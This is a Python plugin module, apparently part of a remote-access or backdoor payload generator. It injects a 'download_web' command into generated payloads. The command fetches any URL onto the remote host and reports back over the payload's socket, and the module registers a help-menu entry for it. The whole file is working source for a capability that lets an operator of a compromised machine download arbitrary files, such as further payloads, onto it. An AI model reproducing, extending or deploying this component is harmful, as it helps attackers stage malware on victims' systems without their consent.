# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from urllib.request import urlopen, unquote')
        self.config.functions.append('''
def download_web(command):
    url = command.split(' ')[1]
    file_name = command.split(' ')[2]
    response = urlopen(url)
    url_data = response.read()
    f = open(file_name, 'wb')
    f.write(url_data)
    f.close()
    send_all(s,'[+]Downloaded : ' + url + ' -> ' + file_name)''')
        self.config.logics.append('''
            elif command == "download_web":
                download_web(data)''')
        self.config.help_menu['download_web <url> <Remote file path>'] = 'Allows you to download a file from a url supplied to a specified remote file path'
    elif option == 'info':
        self.log.blank('\nName             : Download web component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : urllib' \
                       '\nCommands         : download_web <url> <Remote file path>' \
                       '\nDescription      : Allows you to download a file from a url supplied\n')
        return {
            "Name": "Download web component",
            "OS": "Linux",
            "Required Modules": "urllib",
            "Commands": "download_web <url> <Remote file path>",
            "Description": "Allows you to download a file from a url supplied"
        }